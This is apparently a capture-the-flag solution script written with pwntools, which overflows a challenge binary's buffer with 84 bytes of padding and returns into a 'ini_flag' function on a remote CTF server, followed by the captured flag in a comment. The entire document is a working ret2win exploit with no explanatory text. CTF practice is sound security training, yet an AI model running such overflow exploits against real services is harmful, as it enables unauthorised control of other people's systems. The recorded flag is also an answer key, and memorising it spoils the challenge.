from pwn import *
elf = context.binary = ELF("./chall")
# p = process()
p = remote("ctf-chall.stembascc.com",5202)
rop = ROP(context.binary)
offset = 84
rop.raw(b"A" * offset)
rop.raw(elf.sym['ini_flag'])
p.sendline(rop.chain())
print(p.interactive())

# flag : STEMBACTF{ret2win_k4t4_K3t4_Muti4r4}